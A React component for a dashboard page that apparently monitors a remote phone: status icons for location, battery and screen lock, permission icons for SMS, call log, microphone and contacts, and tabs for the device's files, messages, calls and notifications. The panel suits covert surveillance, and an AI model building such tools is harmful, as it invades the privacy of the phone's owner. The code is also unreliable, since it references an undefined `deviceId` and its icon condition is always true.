import { useContext, useEffect, useState } from "react";
import { Link, NavLink, Outlet, useParams } from "react-router";
import "../css/Sidebar.css";
import "@cubone/react-file-manager/dist/style.css";
import axios from "axios";
import { host } from "../../../../serverConfig.json";
import { Context } from "../../../../context/context";
import { useDevice } from "../../../../context/DeviceContext";

function DevicePage() {
  const [device, setDevice] = useState(null);
  const [deviceStatus, setDeviceStatus] = useState(null);
  const [deviceStatusLive, setDeviceStatusLive] = useState(null);
  const [navInput, setNavInput] = useState("");
  const [seconds, setSeconds] = useState(0);

  const { selectedLang: language } = useContext(Context);

  const { id } = useParams();
  const { dispatch } = useDevice();

  useEffect(() => {
    if (id) {
      dispatch({ type: "SET_ACTIVE_DEVICE", payload: id });
    }
  }, [id]);
  // Fetch device info
  // useEffect(() => {
  //   if (!deviceId) return;

  //   const fetchDevice = async () => {
  //     try {
  //       const response = await axios.get(`${host}/devices?uuid=${deviceId}`);
  //       setDeviceId(response.data.uuid);
  //       setDeviceStatusOnline(response.data.is_connected);
  //       setDevice(response.data);
  //     } catch (error) {
  //       console.error("Error fetching device info:", error);
  //     }
  //   };

  //   fetchDevice();
  // }, [deviceId]);
  const iconMap = [
    { permission: "all_file_access", icon: "fa-folder-open" },
    { permission: "battery_optimize", icon: "fa-battery-full" },
    { permission: "notification", icon: "fa-bell" },
    { permission: "auto_display_in_background", icon: "fa-display" },
    { permission: "contact", icon: "fa-address-book" },
    { permission: "sms", icon: "fa-comment-sms" },
    { permission: "call_log", icon: "fa-phone-volume" },
    { permission: "microphone", icon: "fa-microphone" },
    { permission: "location", icon: "fa-location-dot" },
    { permission: "notification_access", icon: "fa-check-double" },
  ];
  // const getInitData = async () => {
  //   try {
  //     const response = await getGrantedPerFromDb(deviceId);
  //     if (response !== null) {
  //       setGrantedPermissions(response?.data?.permissions);
  //     } else {
  //       setGrantedPermissions(null);
  //     }
  //   } catch (error) {
  //     console.error("Error while requesting permission:", error);
  //   }
  // };

  // useEffect(() => {
  //   const loadPermissions = async () => {
  //     if (!grantedPermissions || Object.keys(grantedPermissions).length === 0) {
  //       await getInitData();
  //     }
  //   };
  //   loadPermissions();
  // }, [grantedPermissions]);
  // useEffect(() => {
  //   if (!deviceId) return;

  //   const fetchStatuses = async () => {
  //     if (document.hidden) return; // Skip if tab is not visible

  //     try {
  //       // Fetch static status
  //       const statusRes = await axios.get(
  //         `${host}/information/?uuid=${deviceId}&type=status`
  //       );
  //       if (statusRes.data?.status === "success") {
  //         setDeviceStatus(statusRes.data.data);
  //       } else {
  //         setDeviceStatus(null);
  //       }

  //       // Fetch live status
  //       const liveRes = await axios.get(
  //         `${host}/information/live/?uuid=${deviceId}`
  //       );
  //       if (Array.isArray(liveRes.data) && liveRes.data.length > 0) {
  //         setDeviceStatusLive(liveRes.data[0]);
  //       } else {
  //         setDeviceStatusLive(null);
  //       }
  //     } catch (error) {
  //       console.error("Error fetching device statuses:", error);
  //     }
  //   };

  //   fetchStatuses(); // Call once on mount

  //   const intervalId = setInterval(fetchStatuses, 10000); // Call every 10 seconds

  //   return () => clearInterval(intervalId); // Clean up
  // }, [deviceId]);
  if (!id) {
    return (
      <div className="select-device-message">
        <h2>{language?.devices?.please_select_aDevice}</h2>
      </div>
    );
  }

  return (
    <div className="device">
      <div className="device-header flex">
        <div className="device-info">
          <Link to={``} className="info flex center">
            <i className="center photo fa-solid fa-user"></i>
            <article>
              <h4>
                {language?.devices?.device} {device?.name || "N/A"}
              </h4>
              <p>
                {language?.devices?.id} {deviceId}
              </p>
            </article>
          </Link>

          <div className="input-container flex collumn">
            <input
              onInput={(e) => setNavInput(e.target.value)}
              value={navInput}
              type="text"
              placeholder={language?.devices?.write_something}
            />{" "}
            <div className="icons">
              {iconMap.map(({ permission, icon }) => {
                return (
                  <i
                    key={permission}
                    className={`fa-solid ${icon} ${
                      iconMap ? "active-icon" : ""
                    }`}
                    title={permission}
                  ></i>
                );
              })}
            </div>
          </div>

          <div className="information flex">
            <div className="info-column flex column">
              <div className="info-div flex center">
                <i
                  className={`fa-solid fa-location-dot ${
                    deviceStatus?.gps !== "N/A" && "active-icon"
                  }`}
                ></i>
              </div>{" "}
              <div className="info-div flex center">
                <i
                  className={`fa-solid fa-bolt ${
                    deviceStatusLive?.charging_status !== "Not Charging" &&
                    "active-icon"
                  } `}
                ></i>
              </div>
            </div>

            <div className="info-column flex column">
              <div className="info-div flex center">
                <i
                  className={`fa-solid fa-wifi ${
                    deviceStatus?.wifi === "Connected" && "active-icon"
                  }`}
                ></i>
              </div>
              <div className="info-div flex center">
                <i
                  className={`fa-solid fa-mobile  ${
                    deviceStatusLive?.screen_lock_status !== "Locked" &&
                    "active-icon"
                  } `}
                ></i>
              </div>
            </div>

            <div className="info-column flex column">
              <div className="info-div flex center">
                <i
                  className={`fa-brands fa-bluetooth ${
                    deviceStatus?.bluetooth !== "Off" && "active-icon"
                  }`}
                ></i>
              </div>

              <div className="info-div flex center">
                <p>
                  <i className="fa-solid fa-battery-full rotate-90"></i>

                  {deviceStatusLive?.battery_level != null
                    ? `${deviceStatusLive.battery_level}%`
                    : "N/A"}
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Tabs Header */}
      <div className="tabs-header flex">
        <NavLink to={`file-manager`} className="tab-button">
          {language?.devices?.file_manager}
        </NavLink>
        <NavLink to={`contacts`} className="tab-button">
          {language?.devices?.contacts}
        </NavLink>
        <NavLink to={`sms`} className="tab-button">
          {language?.devices?.sms}
        </NavLink>
        <NavLink to={`call-log`} className="tab-button">
          {language?.devices?.call_log}
        </NavLink>
        <NavLink to={`notifications`} className="tab-button">
          {language?.devices?.notifications}
        </NavLink>
        <NavLink to={`permissions`} className="tab-button">
          {language?.devices?.permissions}
        </NavLink>
        <NavLink to={`info`} className="tab-button">
          {language?.devices?.info}
        </NavLink>
        <NavLink to={`notes`} className="tab-button">
          {language?.devices?.notes}
        </NavLink>
      </div>

      <div className="tabs-content">
        <Outlet />
      </div>
    </div>
  );
}

export default DevicePage;
